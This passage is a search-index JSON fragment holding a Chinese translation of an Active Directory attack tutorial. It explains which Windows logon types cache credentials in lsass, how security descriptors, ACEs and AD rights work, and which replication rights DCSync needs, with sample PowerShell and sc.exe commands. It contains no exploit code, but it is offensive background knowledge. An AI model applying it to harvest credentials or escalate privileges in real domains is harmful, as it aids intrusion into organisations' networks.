<p>\u5f53\u4efb\u52a1\u542f\u52a8\u65f6\uff0c\u5c06\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u5e76\u7f13\u5b58\u51ed\u636e\uff0c\u5c31\u50cf\u5728\u4ea4\u4e92\u5f0f\u767b\u5f55\u4e2d\u4e00\u6837\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#service-logon","title":"Service logon","text":"<p>\u670d\u52a1\u767b\u5f55\u662f\u5728\u7528\u6237\u4e0a\u4e0b\u6587\u4e2d\u542f\u52a8\u670d\u52a1\u65f6\u4f7f\u7528\u7684\u767b\u9646\u65b9\u5f0f\u3002\u5bf9\u4e8e\u8fd9\u79cd\u65b9\u5f0f\uff0c\u4f1a\u5c06\u660e\u6587\u5bc6\u7801\u5b58\u50a8\u5728\u673a\u5668\u7684LSA\u673a\u5bc6\u4e2d\uff0c\u5f53\u670d\u52a1\u6267\u884c\u65f6\uff0c\u51ed\u636e\u5c06\u88ab\u7f13\u5b58\u5230lsass\u8fdb\u7a0b\u4e2d\u3002</p> <p><code>sc.exe create MySvc2 binpath= c:\\windows\\system32\\notepad.exe obj=CONTOSO.local\\svcUser password=svc1234!</code></p> <p>\u4f7f\u7528\u7528\u6237\u51ed\u636e\u521b\u5efa\u670d\u52a1</p> <p>\u8bf7\u6ce8\u610f\uff0c\u670d\u52a1\u767b\u5f55\u662f\u5728\u6267\u884c\u4efb\u52a1\u65f6\u4ea7\u751f\u7684\uff0c\u800c\u4e0d\u662f\u5728\u521b\u5efa\u4efb\u52a1\u65f6\u4ea7\u751f\u7684\u3002\u56e0\u6b64\uff0c\u5373\u4f7f\u60a8\u62e5\u6709\u4f5c\u4e3a\u4efb\u52a1\u8fd0\u884c\u7684\u6743\u9650\uff08\u5982SeBatchLogonRight)\uff0c\u4ecd\u7136\u65e0\u6cd5\u521b\u5efa\u4efb\u52a1\u3002</p> <p>\u5f53\u4efb\u52a1\u542f\u52a8\u65f6\uff0c\u5c06\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u5e76\u7f13\u5b58\u51ed\u636e\uff0c\u5c31\u50cf\u5728\u4ea4\u4e92\u5f0f\u767b\u5f55\u4e2d\u4e00\u6837\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#networkcleartext-logon","title":"NetworkCleartext logon","text":"<p>\u5728\u4f7f\u7528NetworkCleartext\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\uff0c\u5bc6\u7801\u4f1a\u901a\u8fc7\u7f51\u7edc\u53d1\u9001\u5230\u76ee\u6807\u673a\u5668\u4e0a\uff08\u52a0\u5bc6\u901a\u4fe1\uff09\u3002\u5f53\u89c4\u5b9a\u4f7f\u7528CredSSP\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0cPowershell remoting\u5c31\u4f1a\u4f7f\u7528\u8fd9\u79cd\u767b\u5f55\u7c7b\u578b\u3002</p> <p>CredSSP\u4f7f\u7528NTLM\u6216Kerberos\u534f\u8bae\u8fdb\u884c\u7f51\u7edc\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\uff0c\u5f53\u521b\u5efa\u52a0\u5bc6\u901a\u9053\u65f6\uff0c\u4f1a\u5c06\u5bc6\u7801\u53d1\u9001\u5230\u76ee\u6807\u8ba1\u7b97\u673a\u3002</p> <p>\u5e94\u8be5\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u51ed\u636e\u662f\u901a\u8fc7\u7f51\u7edc\u6d41\u91cf\u53d1\u9001\u7684\uff0c\u6240\u4ee5\uff0c\u5b83\u5c06\u88ab\u76ee\u6807\u673a\u6240\u7f13\u5b58\u3002</p> <p><code>New-PSSession -Credential $(Get-Credential) -Authentication Credssp</code></p> <p>\u4f7f\u7528Powershell remoting\u5b8c\u6210NetworkCleartext\u767b\u5f55</p> <p>NewCredentials logon</p> <p>NewCredentials\u767b\u5f55\u53d1\u751f\u5728\u4f7f\u7528\u5e26\u6709/netonly\u53c2\u6570\u7684runas\u7a0b\u5e8f\u65f6\u3002\u7136\u540e\uff0c\u542f\u52a8\u7684\u8fdb\u7a0b\u4ec5\u5728\u8fdc\u7a0b\u8fde\u63a5\u65f6\u4f7f\u7528\u51ed\u636e\uff0c\u5e76\u4e3a\u672c\u5730\u64cd\u4f5c\u4fdd\u7559\u5f53\u524d\u7528\u6237\u4f1a\u8bdd\u3002</p> <p>\u8fd9\u65f6\uff0c\u51ed\u636e\u88ab\u7f13\u5b58\u5728\u672c\u5730lsass\u8fdb\u7a0b\u4e2d\uff0c\u4ee5\u4fbf\u7528\u4e8e\u7f51\u7edc\u8fde\u63a5\u3002\u7136\u540e\uff0c\u5f53\u8fdb\u7a0b\u9700\u8981\u65f6\uff0c\u5b83\u53ef\u4ee5\u6267\u884c\u7f51\u7edc\u767b\u5f55\u4ee5\u8bbf\u95ee\u57df\u7684\u8fdc\u7a0b\u8d44\u6e90\u3002</p> <p><code>runas /netonly /user:CONTOSO\\OtherUser cmd</code></p> <p>\u4f7f\u7528runas\u6267\u884cNewCredentials\u767b\u5f55</p> <p>\u5728\u5b8c\u6210\u7f51\u7edc\u8fde\u63a5\u4e4b\u524d\u4e0d\u4f1a\u68c0\u67e5\u51ed\u636e\uff0c\u4f46\u5728\u6267\u884crunas\u547d\u4ee4\u65f6\u4f1a\u7f13\u5b58\u5b83\u4eec\uff0c\u5c31\u50cf\u5728\u4ea4\u4e92\u5f0f\u767b\u5f55\u4e2d\u4e00\u6837\uff08\u4f46\u662fKerberos\u7968\u8bc1\u9664\u5916\uff0c\u56e0\u4e3a\u5b83\u4eec\u662f\u5728\u68c0\u67e5\u51ed\u636e\u65f6\u68c0\u7d22\u7684\uff09\u3002\u60a8\u5fc5\u987b\u8003\u8651\u5230\u8fd9\u4e00\u70b9\uff0c\u56e0\u4e3a\u8be5\u65b9\u6cd5\u5141\u8bb8\u5728lsass\u8fdb\u7a0b\u4e2d\u7f13\u5b58\u4f2a\u9020\u7684\u51ed\u636e\uff0c\u6709\u65f6\u84dd\u961f\u4f1a\u4f7f\u7528\u8be5\u65b9\u6cd5\u521b\u5efa\u871c\u7f50\u51ed\u636e\u4ee5\u68c0\u6d4b\u653b\u51fb\u8005\u3002</p> <p>RemoteInteractive logon</p> <p>\u901a\u8fc7RDP\u8fde\u63a5\u5230\u8ba1\u7b97\u673a\u65f6\uff0c\u5c31\u4f1a\u4f7f\u7528RemoteInteractive\u767b\u5f55\u3002\u800cRDP\u5219\u4f7f\u7528CredSSP\u8fdb\u884c\u8fdc\u7a0b\u767b\u5f55\uff0c\u56e0\u6b64\uff0c\u5bc6\u7801\u5c06\u901a\u8fc7\u7f51\u7edc\u53d1\u9001\u5230\u76ee\u6807\u8ba1\u7b97\u673a\uff0c\u56e0\u6b64\uff0c\u51ed\u636e\u5c06\u88ab\u7f13\u5b58\u5728\u8fdc\u7a0blsass\u8fdb\u7a0b\u4e2d\u3002</p> <p></p> <p>\u4f7f\u7528RDP\u8fdb\u884c\u8fdc\u7a0b\u4ea4\u4e92\u767b\u5f55</p> <p>\u8eab\u4efd\u9a8c\u8bc1\u7c7b\u4f3c\u4e8e\u7f51\u7edc\u767b\u5f55\uff0c\u4f46\u51ed\u636e\u4f1a\u88ab\u53d1\u9001\u5230\u76ee\u6807\u8ba1\u7b97\u673a\uff0c\u56e0\u6b64\uff0c\u5b83\u4eec\u4f1a\u50cf\u4ea4\u4e92\u5f0f\u767b\u5f55\u65f6\u90a3\u6837\u88ab\u7f13\u5b58\u3002</p> <p>\u4e3a\u4e86\u80fd\u591f\u901a\u8fc7RemoteInteractive\u767b\u5f55\u65b9\u5f0f\u767b\u5f55\u8fdc\u7a0b\u8ba1\u7b97\u673a\uff0c\u60a8\u7684\u7528\u6237\u9700\u8981\u6210\u4e3a\u8fdc\u7a0b\u684c\u9762\u7528\u6237\u7684\u4e00\u90e8\u5206\uff0c\u6216\u8005\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e2d\u62e5\u6709SeRemoteInteractiveLogonRight\u6743\u9650\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#authorization","title":"Authorization","text":"<p>\u4e00\u65e6\u5ba2\u6237\u7aef\u80fd\u591f\u89e3\u6790\u76ee\u6807\u4e3b\u673a\u540d\u5e76\u8fdb\u884c\u4e86\u8eab\u4efd\u9a8c\u8bc1\uff0c\u76ee\u6807\u670d\u52a1/\u7a0b\u5e8f/\u8ba1\u7b97\u673a\u73b0\u5728\u5c31\u5e94\u8be5\u80fd\u591f\u4e86\u89e3\u5176\u6743\u9650\uff0c\u6216\u8005\u8bf4\uff0c\u5c31\u80fd\u77e5\u9053\u7528\u6237\u7684username\u548cSID\u4ee5\u53ca\u5b83\u6240\u5c5e\u7684\u7ec4\u3002\u4e00\u65e6\u77e5\u9053\u4e86\u8fd9\u4e9b\u4fe1\u606f\uff0c\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u51b3\u5b9a\u7528\u6237\u662f\u5426\u6709\u8db3\u591f\u7684\u6743\u9650\u8bbf\u95ee\u67d0\u4e9b\u5bf9\u8c61\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#acls","title":"ACLs","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#security-descriptor","title":"Security descriptor","text":"<p>\u4f46\u662f\uff0c\u5982\u4f55\u68c0\u67e5\u7528\u6237\u662f\u5426\u6709\u6743\u8bbf\u95ee\u5bf9\u8c61\u5462\uff1f\u65b9\u6cd5\u662f\u68c0\u67e5\u5176\u5b89\u5168\u63cf\u8ff0\u7b26\u3002\u5728Active Directory\u4e2d\uff0c\u6570\u636e\u5e93\u7684\u6bcf\u4e2a\u5bf9\u8c61\u5728\u5176NTSecurityDescriptor\u5c5e\u6027\u4e2d\u90fd\u6709\u4e00\u4e2a\u5173\u8054\u7684\u5b89\u5168\u63cf\u8ff0\u7b26\u3002\u5e76\u4e14\uff0c\u5b89\u5168\u63cf\u8ff0\u7b26\u662f\u4ee5\u4e8c\u8fdb\u5236\u683c\u5f0f\u5b58\u50a8\u7684\uff0c\u4f46\u4e5f\u53ef\u4ee5\u8f6c\u6362\u4e3aSecurity Descriptor String Format\u683c\u5f0f\u3002</p> <p>\u5b89\u5168\u63cf\u8ff0\u7b26\u5305\u542b\u4ee5\u4e0b\u5b89\u5168\u4fe1\u606f\uff1a</p> <ul> <li>\u4f5c\u4e3a\u5bf9\u8c61\u6240\u6709\u8005\u7684\u4e3b\u4f53\u7684SID</li> <li>\u6240\u6709\u8005\u4e3b\u8981\u7ec4\u7684SID</li> <li>\uff08\u53ef\u9009\uff09DACL\uff08Discretionary Access Control List\uff0c\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff09</li> <li>\uff08\u53ef\u9009\uff09SACL\uff08System Access Control List\uff0c\u7cfb\u7edf\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff09</li> </ul> <p><code>PS C:\\&gt; $(Get-ADUser anakin -Properties nTSecurityDescriptor).nTSecurityDescriptor | select Owner,Gro up,Access,Audit | Format-List   Owner  : CONTOSO\\Domain Admins Group  : CONTOSO\\Domain Admins Access : {System.DirectoryServices.ActiveDirectoryAccessRule, System.DirectoryServices.ActiveDirectoryAccessRule,          System.DirectoryServices.ActiveDirectoryAccessRule, System.DirectoryServices.ActiveDirectoryAccessRule...} Audit  :</code></p> <p>\u83b7\u53d6\u7528\u6237\u5bf9\u8c61\u7684\u5b89\u5168\u63cf\u8ff0\u7b26</p> <p>\u5982\u4f60\u6240\u89c1\uff0c\u6bcf\u4e2a\u5b89\u5168\u63cf\u8ff0\u7b26\u4e2d\u53ef\u4ee5\u6709\u4e24\u4e2aACL\uff08Access Control List\uff0c\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff09\uff1aDACL\u548cSACL\u3002\u5176\u4e2d\uff0cACL\u662f\u4e00\u4e2a\u7531ACE\uff08Access Control Entry\uff0c\u8bbf\u95ee\u63a7\u5236\u6761\u76ee\uff09\u7ec4\u6210\u7684\u5217\u8868\u3002SACL\u7684ACE\u5b9a\u4e49\u4e86\u4f1a\u751f\u6210\u65e5\u5fd7\u7684\u8bbf\u95ee\u5c1d\u8bd5\uff0c\u4ece\u9632\u5fa1\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u5b83\u4eec\u53ef\u80fd\u5f88\u6709\u7528\u3002</p> <p>\u7136\u800c\uff0c\u6700\u91cd\u8981\u7684\u90e8\u5206\u662fDACL\uff0c\u5b83\u901a\u5e38\u5b58\u5728\u4e8e\u6240\u6709\u7684\u5bf9\u8c61\u4e2d\uff0c\u5176ACE\u51b3\u5b9a\u4e86\u53ef\u4ee5\u8bbf\u95ee\u5bf9\u8c61\u7684\u7528\u6237/\u7ec4\uff0c\u4ee5\u53ca\u5141\u8bb8\u7684\u8bbf\u95ee\u7c7b\u578b\u3002\u901a\u5e38\uff0c\u5f53\u6709\u4eba\u8c08\u8bba\u5bf9\u8c61\u7684ACL\u65f6\uff0c\u5b83\u6307\u7684\u662fDACL\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#aces","title":"ACEs","text":"<p>\u6bcf\u4e2aACE\u90fd\u5305\u542b\u4e0b\u9762\u51e0\u4e2a\u90e8\u5206\uff1a</p> <ul> <li>ACE\u7c7b\u578b\uff1a\u6307\u5b9aACE\u662f\u7528\u4e8e\u5141\u8bb8\u8fd8\u662f\u62d2\u7edd\u8bbf\u95ee(\u5982\u679c\u662fSACL\uff0c\u5219\u7528\u4e8e\u8bb0\u5f55\u8bbf\u95ee)\u3002</li> <li>\u7ee7\u627f\u6027\uff1a\u6307\u793a\u662f\u5426\u7ee7\u627f\u4e86ACE\u3002</li> <li>\u4e3b\u4f53/\u8eab\u4efd\uff1a\u8868\u793a\u5e94\u7528ACE\u7684\u4e3b\u4f53(\u7528\u6237/\u7ec4)\u3002\u5b58\u50a8\u4e3b\u4f53SID\u3002</li> <li>\u6743\u9650\uff1a\u6307\u793aACE\u5e94\u7528\u7684\u8bbf\u95ee\u7c7b\u578b\u3002</li> <li>\u5bf9\u8c61\u7c7b\u578b\uff1a\u6839\u636e\u8bbf\u95ee\u63a9\u7801\u6807\u5fd7\u6307\u793a\u6269\u5c55\u6743\u9650\u3001\u5c5e\u6027\u6216\u5b50\u5bf9\u8c61\u7684GUID\u3002\u5982\u679c\u4e0d\u4f7f\u7528\uff0c\u5219\u8bbe\u7f6e\u4e3a\u96f6\u3002</li> <li>\u7ee7\u627f\u7c7b\u578b\uff1a\u53ef\u4ee5\u4ece\u8be5\u5bf9\u8c61\u7ee7\u627fACE\u7684\u5bf9\u8c61\u7c7b\u7684\u7c7b\u578b\u3002</li> </ul> <p><code>PS C:\\Users\\Administrator&gt; $(Get-ADUser anakin -Properties nTSecurityDescriptor).nTSecurityDescriptor.Access[0]   ActiveDirectoryRights : GenericRead InheritanceType       : None ObjectType            : 00000000-0000-0000-0000-000000000000 InheritedObjectType   : 00000000-0000-0000-0000-000000000000 ObjectFlags           : None AccessControlType     : Allow IdentityReference     : NT AUTHORITY\\SELF IsInherited           : False InheritanceFlags      : None PropagationFlags      : None</code></p> <p>\u7528\u6237\u8d26\u6237\u7684ACE</p> <p>\u56e0\u6b64\uff0cACE\u53ef\u4ee5\u7528\u6765\u6388\u4e88\u8bbf\u95ee\u6743\uff0c\u540c\u65f6\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u9650\u5236\u8bbf\u95ee\u6743\u3002\u5e94\u8be5\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4e00\u4e2a\u4e3b\u4f53\u540c\u65f6\u88ab\u4e0d\u540c\u7684ACE\u5141\u8bb8\u548c\u62d2\u7edd\u8bbf\u95ee\uff0c\u90a3\u4e48\u8868\u793a\u62d2\u7edd\u7684ACE\u5c06\u5177\u6709\u4f18\u5148\u6743\uff0c\u56e0\u6b64\uff0c\u8bbf\u95ee\u5c06\u88ab\u62d2\u7edd\u3002</p> <p>\u53e6\u4e00\u65b9\u9762\uff0cACE\u53ef\u4ee5\u4ece\u6570\u636e\u5e93\u7684\u7236\u5bf9\u8c61\uff08OU\u548c\u5bb9\u5668\uff09\u7ee7\u627f\uff0c\u5b9e\u9645\u4e0a\uff0c\u5927\u591a\u6570\u9002\u7528\u4e8e\u5bf9\u8c61\u7684ACE\u90fd\u662f\u7ee7\u627f\u7684\u3002\u5982\u679c\u7ee7\u627f\u7684\u8bbf\u95ee\u4e0e\u663e\u5f0fACE(\u975e\u7ee7\u627f)\u51b2\u7a81\uff0c\u5219\u663e\u5f0fACE\u786e\u5b9a\u8bbf\u95ee\u89c4\u5219\u3002\u56e0\u6b64\uff0cACE\u7684\u4f18\u5148\u987a\u5e8f\u5982\u4e0b\uff1a</p> <ul> <li>\u663e\u5f0f\u62d2\u7eddACE</li> <li>\u663e\u5f0f\u5141\u8bb8ACE</li> <li>\u7ee7\u627f\u5f0f\u62d2\u7eddACE</li> <li>\u7ee7\u627f\u5f0f\u5141\u8bb8ACE</li> </ul> <p>\u6709\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\u4e0d\u53d7ACEs\u7684\u9650\u5236\uff0c\u90a3\u5c31\u662f\u5bf9\u8c61\u6240\u6709\u8005\u3002\u6240\u6709\u8005\u62e5\u6709\u4fee\u6539\u5bf9\u8c61ACE\u7684\u9690\u5f0f\u6743\u9650\uff08WriteDacl\u6743\u9650\uff09\u3002</p> <p>\u6b64\u5916\uff0c\u8fd8\u5fc5\u987b\u8003\u8651\u5230\uff0c\u5982\u679c\u5b89\u5168\u63cf\u8ff0\u7b26\u6ca1\u6709DACL\uff08DACL\u8bbe\u7f6e\u4e3aNULL\uff09\uff0c\u90a3\u4e48\uff0c\u6bcf\u4e2a\u4eba\u90fd\u53ef\u4ee5\u8bbf\u95ee\u8be5\u5bf9\u8c61\u3002\u7136\u800c\uff0c\u5982\u679c\u5b89\u5168\u63cf\u8ff0\u7b26\u6709\u4e00\u4e2a\u7a7a\u7684DACL\uff08DACL\u4e2d\u6ca1\u6709ACE\uff09\uff0c\u5219\u610f\u5473\u7740\u6ca1\u6709\u4eba\u53ef\u4ee5\u8bbf\u95ee\u8be5\u5bf9\u8c61\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#rights","title":"Rights","text":"<p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528ACE\u6307\u5b9a\u4ee5\u4e0b\u6743\u9650\uff1a</p> <ul> <li>Delete\uff1a\u5220\u9664\u5bf9\u8c61\u3002</li> <li>ReadControl\uff1a\u8bfb\u53d6\u5b89\u5168\u63cf\u8ff0\u7b26\uff0c\u4f46SACL\u9664\u5916\u3002</li> <li>WriteDacl\uff1a\u4fee\u6539\u5b89\u5168\u63cf\u8ff0\u7b26\u4e2d\u7684\u5bf9\u8c61DACL\u3002</li> <li>WriteOwner\uff1a\u4fee\u6539\u5b89\u5168\u63cf\u8ff0\u7b26\u4e2d\u7684\u5bf9\u8c61\u6240\u6709\u8005\u3002</li> <li>CreateChild\uff1a\u521b\u5efa\u5b50\u5bf9\u8c61\u3002\u9002\u7528\u4e8e\u5bb9\u5668\u3002</li> <li>DeleteChild\uff1a\u5220\u9664\u5b50\u5bf9\u8c61\u3002\u9002\u7528\u4e8e\u5bb9\u5668\u3002</li> <li>ListContents\uff1a\u5217\u51fa\u5b50\u5bf9\u8c61\u3002\u9002\u7528\u4e8e\u5bb9\u5668\u3002\u5982\u679c\u672a\u6388\u4e88\u6b64\u6743\u9650\u6216ListObject\u6743\u9650\uff0c\u5219\u5bf9\u7528\u6237\u9690\u85cf\u8be5\u5bf9\u8c61\u3002</li> <li>ReadProperty\uff1a\u8bfb\u53d6\u5bf9\u8c61\u7c7b\u578b\u4e2d\u6307\u5b9a\u7684\u5c5e\u6027\u6216\u5c5e\u6027\u96c6\u3002\u5982\u679c\u5bf9\u8c61\u7c7b\u578b\u4e3a\u96f6\uff0c\u5219\u53ef\u4ee5\u8bfb\u53d6\u6240\u6709\u5c5e\u6027\u3002\u5b83\u4e0d\u5141\u8bb8\u8bfb\u53d6\u673a\u5bc6\u5c5e\u6027\u3002</li> <li>WriteProperty\uff1a\u4fee\u6539\u5bf9\u8c61\u7c7b\u578b\u4e2d\u6307\u5b9a\u7684\u5c5e\u6027\u3002\u5982\u679c\u5bf9\u8c61\u7c7b\u578b\u4e3a\u96f6\uff0c\u5219\u53ef\u4ee5\u4fee\u6539\u6240\u6709\u5c5e\u6027\u3002</li> <li>WritePropertyExtended\uff1a\u6267\u884c\u5df2\u9a8c\u8bc1\u7684\u5199\u5165\u6743\u9650\u3002\u4e5f\u8bb8\u6700\u6709\u8da3\u7684\u5df2\u9a8c\u8bc1\u7684\u5199\u5165\u6743\u9650\u662f\u7ec4\u7684Self-Membership\u6743\u9650\uff0c\u5b83\u5141\u8bb8\u4f7f\u7528ACE\u5c06\u5f53\u524d\u7528\u6237\u6dfb\u52a0\u5230\u7ec4\u4e2d\u3002</li> <li>DeleteTree\uff1a\u4f7f\u7528delete-tree\u64cd\u4f5c\u5220\u9664\u6240\u6709\u5b50\u5bf9\u8c61\u3002</li> <li>ListObject\uff1a\u5217\u51fa\u5bf9\u8c61\u3002\u5982\u679c\u672a\u6388\u4e88\u8be5\u6743\u9650\u6216ListContents\u6743\u9650\uff0c\u5219\u5bf9\u7528\u6237\u9690\u85cf\u8be5\u5bf9\u8c61\u3002</li> <li>ControlAccess\uff1a\u53ef\u4ee5\u6839\u636e\u5bf9\u8c61\u7c7b\u578b\u4ee5\u591a\u79cd\u4e0d\u540c\u65b9\u5f0f\u89e3\u91ca\u7684\u7279\u6b8a\u6743\u9650\u3002\u5982\u679c\u5bf9\u8c61\u7c7b\u578b\u662f\u673a\u5bc6\u5c5e\u6027\u7684GUID\uff0c\u5219\u6388\u4e88\u8bfb\u53d6\u8be5\u5c5e\u6027\u7684\u6743\u9650\u3002\u5982\u679c\u662f\u6ce8\u518c\u5728\u6570\u636e\u5e93\u67b6\u6784\u4e2d\u7684\u6269\u5c55\u6743\u9650\u7684GUID\uff0c\u5219\u7ed9\u51fa\u8be5\u6743\u9650\u3002\u5982\u679c\u5bf9\u8c61\u7c7b\u578b\u4e3anull\uff08GUID\u4e3a\u5168\u96f6\uff09\uff0c\u5219\u6388\u4e88\u6240\u6709\u6269\u5c55\u6743\u9650\u3002</li> </ul> <p>\u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u56ca\u62ec\u591a\u79cd\u6743\u9650\u7684\u6cdb\u578b\u6743\u9650\uff08generic rights\uff09\uff1a</p> <ul> <li>GenericRead\uff1aReadControl\u3001ListContents\u3001ReadProperty\uff08\u5168\u90e8\uff09</li> <li>GenericWrite\uff1aReadControl\u3001WriteProperty\uff08\u5168\u90e8\uff09\u3001WritePropertyExtended\uff08\u5168\u90e8\uff09</li> <li>GenericExecute\uff1aReadControl\u3001ListCont</li> <li>GenericAll\uff1aDelete\u3001WriteDacl\u3001WriteOwner\u3001CreateChild\u3001DeleteChild\u3001DeleteTree\u3001ControlAccess\uff08\u5168\u90e8\uff09\u3001GenericAll\u3001GenericWrite</li> </ul> <p>\u540c\u65f6\uff0c\u8fd8\u6709\u8bb8\u591a\u6269\u5c55\u6743\u9650\uff0c\u4f46\u4ee5\u4e0b\u662f\u6211\u4eec\u6700\u611f\u5174\u8da3\u7684\uff1a</p> <ul> <li>User-Force-Change-Password\uff1a\u5728\u4e0d\u77e5\u9053\u5f53\u524d\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u66f4\u6539\u7528\u6237\u5bc6\u7801\u3002\u9002\u7528\u4e8e\u7528\u6237\u5bf9\u8c61\u3002\u4e0d\u8981\u4e0eUser-Change-Password\u6743\u9650\u6df7\u6dc6\uff0c\u56e0\u4e3a\u5b83\u9700\u8981\u5728\u5df2\u7ecf\u77e5\u9053\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u4fee\u6539\u3002</li> <li>DS-Replication-Get-Changes\uff1a\u590d\u5236\u6570\u636e\u5e93\u6570\u636e\u3002\u9002\u7528\u4e8e\u57df\u5bf9\u8c61\u3002\u6267\u884cdcsync\u6240\u9700\u3002</li> <li>ds-replication-get-changes-all\uff1a\u590d\u5236\u6570\u636e\u5e93\u673a\u5bc6\u6570\u636e\u3002\u5bf9\u4e8e\u57df\u5bf9\u8c61\u3002\u6267\u884cdcsync\u6240\u9700\u3002</li> </ul> <p><code>PS C:\\Users\\Administrator\\Downloads&gt; (Get-Acl 'AD:\\DC=contoso,DC=local').Access[49]  ActiveDirectoryRights : ExtendedRight InheritanceType       : None ObjectType            : 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 InheritedObjectType   : 00000000-0000-0000-0000-000000000000 ObjectFlags           : ObjectAceTypePresent AccessControlType     : Allow IdentityReference     : CONTOSO\\Domain Controllers IsInherited           : False InheritanceFlags      : None PropagationFlags      : None</code></p> <p>\u57df\u7684DS-Replication-Get-Changes-All\u6743\u9650</p> <p>\u524d\u9762\u7684\u4f8b\u5b50\u663e\u793a\u4e86\u4e00\u4e2aExtendedRight ACE\uff0c\u5b83\u4e3aDomain Controllers\u7ec4\u63d0\u4f9b\u4e86\u57df\u4e2d\u7684DS-Replication-Get-Changes-All\u6743\u9650\u3002</p> <p>\u5982\u60a8\u6240\u60f3\uff0c\u5f53\u6709\u4eba\u8bf4Domain Admins\u7ec4\u5728\u57df\u4e2d\u5177\u6709\u7ba1\u7406\u6743\u9650\u65f6\uff0c\u8fd9\u610f\u5473\u7740\u8bb8\u591a\u5bf9\u8c61\u4e2d\u7684ACE\u8d4b\u4e88\u4e86\u8fd9\u4e2a\u7ec4\u5927\u91cf\u7684\u6743\u9650\uff0c\u6240\u4ee5\uff0c\u5982\u679c\u60a8\u5c5e\u4e8eDomain Admin\u7ec4\uff0c\u90a3\u4e48\uff0c\u60a8\u5c31\u53ef\u4ee5\u6267\u884c\u5f88\u591a\u7279\u6743\u64cd\u4f5c\uff0c\u4f46\u6700\u7ec8\u51b3\u5b9a\u4e00\u4e2a\u7ec4/\u7528\u6237\u6743\u9650\u7684\u5374\u662f\u5bf9\u8c61\u7684DACL\u3002</p> <p>\u9664\u4e86\u6570\u636e\u5e93\u5bf9\u8c61\uff0c\u5728Windows\u8ba1\u7b97\u673a\u4e2d\uff0c\u8fd8\u6709\u8bb8\u591a\u53d7\u672c\u5730\u8ba1\u7b97\u673a\u7ba1\u7406\u7684\u672c\u5730DACL\u4fdd\u62a4\u7684\u5b89\u5168\u5bf9\u8c61\u3002\u8fd9\u4e9b\u5bf9\u8c61\u5305\u62ec\u6587\u4ef6/\u76ee\u5f55\u3001\u8fdb\u7a0b\u3001\u6ce8\u518c\u8868\u9879\u6216\u670d\u52a1\u3002\u4f46\u7531\u4e8e\u57df\u7ba1\u7406\u5458\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u88ab\u6dfb\u52a0\u5230\u8ba1\u7b97\u673a\u4e2d\u7684\u672c\u5730\u7ba1\u7406\u5458\u7ec4\uff0c\u56e0\u6b64\u57df\u7ba1\u7406\u5458\u901a\u5e38\u53ef\u4ee5\u8bbf\u95eeWindows\u8ba1\u7b97\u673a\u4e2d\u7684\u4efb\u4f55\u672c\u5730\u5bf9\u8c61\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528Get-Acl\u3001icacls\u7b49\u5de5\u5177\u6765\u68c0\u67e5\u6587\u4ef6ACL\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#acl-attacks","title":"ACL 